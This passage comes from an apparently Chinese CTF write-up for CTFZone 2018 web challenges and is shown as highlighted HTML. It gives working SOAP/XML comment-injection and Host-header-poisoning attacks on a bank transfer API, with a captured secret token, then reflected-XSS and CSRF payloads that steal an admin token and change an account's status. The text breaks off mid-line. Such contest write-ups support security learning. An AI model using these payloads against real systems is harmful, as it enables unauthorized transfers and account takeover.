class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransfer\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:operation</span> <span class=\"attr\">soapAction</span>=<span class=\"string\">\"urn:internalTransferAction\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">binding</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">wsdl:service</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankService\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">wsdl:port</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankServicePort\"</span> <span class=\"attr\">binding</span>=<span class=\"string\">\"tns:BankServiceBinding\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:address</span> <span class=\"attr\">location</span>=<span class=\"string\">\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">wsdl:port</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">wsdl:service</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">wsdl:definitions</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>包含两个API</p>\n<ul>\n<li><strong>Request Balance</strong> allows us to see the balance of any account id we want.</li>\n<li><strong>Internal Transfer</strong> transfers some amount from account <em>sender</em> to account <em>receiver</em>.</li>\n</ul>\n</li>\n<li><p>解法1：XML/soap注入</p>\n<p>internalTransfer请求：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span> [DATA FROM FORM INPUT] <span class=\"tag\">&lt;/<span class=\"name\">receiver_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">sender_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span> [LOGGED IN USER ID] <span class=\"tag\">&lt;/<span class=\"name\">sender_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">amount</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:float\"</span>&gt;</span> [DATA FROM FORM INPUT] <span class=\"tag\">&lt;/<span class=\"name\">amount</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">token</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:string\"</span>&gt;</span> [SECRET SERVER TOKEN] <span class=\"tag\">&lt;/<span class=\"name\">token</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>传递参数Receiver:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(Our ID) &lt;/receiver_wallet_num&gt;</span><br><span class=\"line\">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;(Any ID)&lt;/sender_wallet_num&gt;&lt;!--</span><br></pre></td></tr></table></figure>\n<p>传递参数Amount:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--&gt;&lt;amount xsi:type=&quot;xsd:float&quot;&gt; (Amount)</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span> (Our ID) <span class=\"tag\">&lt;/<span class=\"name\">receiver_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">sender_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span>(Any ID)<span class=\"tag\">&lt;/<span class=\"name\">sender_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- &lt;/receiver_wallet_num&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;sender_wallet_num xsi:type=\"xsd:decimal\"&gt; [LOGGED IN USER ID] &lt;/sender_wallet_num&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;amount xsi:type=\"xsd:float\"&gt; </span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">amount</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:float\"</span>&gt;</span> (Amount) <span class=\"tag\">&lt;/<span class=\"name\">amount</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">token</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:string\"</span>&gt;</span> [SECRET SERVER TOKEN] <span class=\"tag\">&lt;/<span class=\"name\">token</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后开burp跑就行。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803174532.png\" alt=\"\"></p>\n</li>\n<li><p>解法2：Host header poisoning</p>\n<p>从上图，我们可以看到当前Host是<code>web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one</code></p>\n<p>修改该Host为我们的vps_ip,并在我们的vps上创建<code>/api/bankservice.wsdl.php</code>文件，然后发包，监听80端口。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803181237.png\" alt=\"\"></p>\n<p>监听端口:</p>\n<blockquote>\n<p>ngrep -q -d eth0 -W byline port 80</p>\n</blockquote>\n<p>抓包结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">T 10.135.89.224:80 -&gt; 18.184.147.62:46038 [A]</span><br><span class=\"line\">HTTP/1.1 200 OK.</span><br><span class=\"line\">Date: Fri, 03 Aug 2018 10:08:43 GMT.</span><br><span class=\"line\">Server: Apache/2.4.6 (CentOS) PHP/5.4.16.</span><br><span class=\"line\">X-Powered-By: PHP/5.4.16.</span><br><span class=\"line\">Content-Length: 2907.</span><br><span class=\"line\">Connection: close.</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;Bank&quot;</span><br><span class=\"line\">             targetNamespace=&quot;urn:Bank&quot;</span><br><span class=\"line\">             xmlns:tns=&quot;urn:Bank&quot;</span><br><span class=\"line\">             xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;</span><br><span class=\"line\">             xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class=\"line\">             xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span><br><span class=\"line\">             xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;</span><br><span class=\"line\">             xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;BalanceRequest&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;BalanceResponse&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;internalTransferRequest&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;internalTransferResponse&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;portType name=&quot;BankServicePort&quot;&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;requestBalance&quot;&gt;</span><br><span class=\"line\">            &lt;input message=&quot;tns:BalanceRequest&quot;/&gt;</span><br><span class=\"line\">            &lt;output message=&quot;tns:BalanceResponse&quot;/&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;internalTransfer&quot;&gt;</span><br><span class=\"line\">            &lt;input message=&quot;tns:internalTransferRequest&quot;/&gt;</span><br><span class=\"line\">            &lt;output message=&quot;tns:internalTransferResponse&quot;/&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">    &lt;/portType&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;binding name=&quot;BankServiceBinding&quot; type=&quot;tns:BankServicePort&quot;&gt;</span><br><span class=\"line\">        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;requestBalance&quot;&gt;</span><br><span class=\"line\">            &lt;soap:operation soapAction=&quot;urn:requestBalanceAction&quot;/&gt;</span><br><span class=\"line\">            &lt;input&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/input&gt;</span><br><span class=\"line\">            &lt;output&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/output&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;internalTransfer&quot;&gt;</span><br><span class=\"line\">            &lt;soap:operation soapAction=&quot;urn:internalTransferAction&quot;/&gt;</span><br><span class=\"line\">            &lt;input&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/input&gt;</span><br><span class=\"line\">            &lt;output&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/output&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">    &lt;/b</span><br><span class=\"line\"></span><br><span class=\"line\">T 10.135.89.224:80 -&gt; 18.184.147.62:46038 [AP]</span><br><span class=\"line\">inding&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;wsdl:service name=&quot;BankService&quot;&gt;</span><br><span class=\"line\">        &lt;wsdl:port name=&quot;BankServicePort&quot; binding=&quot;tns:BankServiceBinding&quot;&gt;</span><br><span class=\"line\">            &lt;soap:address location=&quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&quot; /&gt;</span><br><span class=\"line\">        &lt;/wsdl:port&gt;</span><br><span class=\"line\">    &lt;/wsdl:service&gt;</span><br><span class=\"line\">&lt;/wsdl:definitions&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">T 18.184.147.62:46040 -&gt; 10.135.89.224:80 [AP]</span><br><span class=\"line\">POST /api/bankservice.php HTTP/1.1.</span><br><span class=\"line\">Host: 123.207.90.143.</span><br><span class=\"line\">Connection: Keep-Alive.</span><br><span class=\"line\">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.</span><br><span class=\"line\">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.</span><br><span class=\"line\">Content-Length: 869.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class=\"line\">      &lt;SOAP-ENV:Body&gt;</span><br><span class=\"line\">        &lt;ns1:internalTransfer&gt;</span><br><span class=\"line\">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;.</span><br><span class=\"line\">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;.2652.&lt;/sender_wallet_num&gt;&lt;!--&lt;/receiver_wallet_num&gt;</span><br><span class=\"line\">          &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/sender_wallet_num&gt;</span><br><span class=\"line\">          &lt;amount xsi:type=&quot;xsd:float&quot;&gt;--&gt;&lt;amount xsi:type=&quot;xsd:float&quot;&gt;750000&lt;/amount&gt;</span><br><span class=\"line\">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;</span><br><span class=\"line\">        &lt;/ns1:internalTransfer&gt;</span><br><span class=\"line\">      &lt;/SOAP-ENV:Body&gt;</span><br><span class=\"line\">    &lt;/SOAP-ENV:Envelope&gt;</span><br><span class=\"line\">   </span><br><span class=\"line\">T 10.135.89.224:80 -&gt; 18.184.147.62:46040 [AP]</span><br><span class=\"line\">HTTP/1.1 404 Not Found.</span><br><span class=\"line\">Date: Fri, 03 Aug 2018 10:08:43 GMT.</span><br><span class=\"line\">Server: Apache/2.4.6 (CentOS) PHP/5.4.16.</span><br><span class=\"line\">Content-Length: 217.</span><br><span class=\"line\">Keep-Alive: timeout=5, max=100.</span><br><span class=\"line\">Connection: Keep-Alive.</span><br><span class=\"line\">Content-Type: text/html; charset=iso-8859-1.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class=\"line\">&lt;html&gt;&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class=\"line\">&lt;p&gt;The requested URL /api/bankservice.php was not found on this server.&lt;/p&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>这样我们就拿到了token，然后就可以愉快的转账了。</p>\n<p>直接按这个发这个包即可:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">T 18.184.147.62:46040 -&gt; 10.135.89.224:80 [AP]</span><br><span class=\"line\">POST /api/bankservice.php HTTP/1.1.</span><br><span class=\"line\">Host: 123.207.90.143.</span><br><span class=\"line\">Connection: Keep-Alive.</span><br><span class=\"line\">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.</span><br><span class=\"line\">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.</span><br><span class=\"line\">Content-Length: 869.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class=\"line\">      &lt;SOAP-ENV:Body&gt;</span><br><span class=\"line\">        &lt;ns1:internalTransfer&gt;</span><br><span class=\"line\">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;.</span><br><span class=\"line\">\t\t &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;2652&lt;/sender_wallet_num&gt;</span><br><span class=\"line\">\t\t &lt;amount xsi:type=&quot;xsd:float&quot;&gt;750000&lt;/amount&gt;</span><br><span class=\"line\">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;</span><br><span class=\"line\">        &lt;/ns1:internalTransfer&gt;</span><br><span class=\"line\">      &lt;/SOAP-ENV:Body&gt;</span><br><span class=\"line\">    &lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"Magician\"><a href=\"#Magician\" class=\"headerlink\" title=\"Magician\"></a>Magician</h2><ol>\n<li><p>从support.php可知该题应该是XSS。修改<em>Link to Profile</em>可以判断后台bot使用<em>Firefox 61.0</em></p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803210045.png\" alt=\"\"></p>\n<p>vps日志显示如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET / HTTP/1.1&quot; 200 65 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class=\"line\">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class=\"line\">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>xss漏洞</p>\n<p>uuid存在反射型xss,限制长度36个字符</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803211936.png\" alt=\"\"></p>\n</li>\n<li><p>how to get flag</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803212218.png\" alt=\"\"></p>\n<p>这里需要管理员将<code>Status</code>修改为<code>Premium</code></p>\n</li>\n<li><p>思路：</p>\n<p>CSP如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: style-src &apos;self&apos; &apos;unsafe-inline&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</span><br><span class=\"line\">X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one</span><br><span class=\"line\">X-XSS-Protection: 1; mode=block</span><br></pre></td></tr></table></figure>\n<p>由于后台使用Firefox,所以<code>X-XSS-Protections</code> 没有作用。</p>\n<p>通过XSRF修改状态。</p>\n</li>\n<li><p>解法1：</p>\n<p>payload如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">      window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, `</span><br><span class=\"line\">        $.get(&quot;manage.php&quot;, function(data)&#123;    </span><br><span class=\"line\">                var x = /name=&quot;token&quot; value=&quot;([^&quot;]+)/.exec(data);</span><br><span class=\"line\">                $.post(&quot;manage.php&quot;, &#123;user_uuid: &quot;86dced2a-0305-42ed-a13c-f0c2e6079805&quot;, token: x[1], status: &quot;premium&quot;&#125;); </span><br><span class=\"line\">         &#125;);</span><br><span class=\"line\">   `);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>含义:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, &lt;long payload&gt;)</span><br></pre></td></tr></table></figure>\n<p>将 window.name 设置为<code>&lt;long payload&gt;</code>。</p>\n<p>将该html放在vps上，然后提交即可。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803213031.png\" alt=\"\"></p>\n<p>getflag</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803212919.png\" alt=\"\"></p>\n</li>\n<li><p>解法2:</p>\n<p>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;iframe onload=srcdoc=window.name&gt;</span><br></pre></td></tr></table></figure>\n<p><code>iframe</code>在使用参数<code>srcdoc</code>加载的时候，会被当做同一个源。</p>\n<p>测试，在Firefox下测试</p>\n<p>打开Firefox,在控制台中输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.name=&apos;&lt;script&gt;alert(&quot;This is 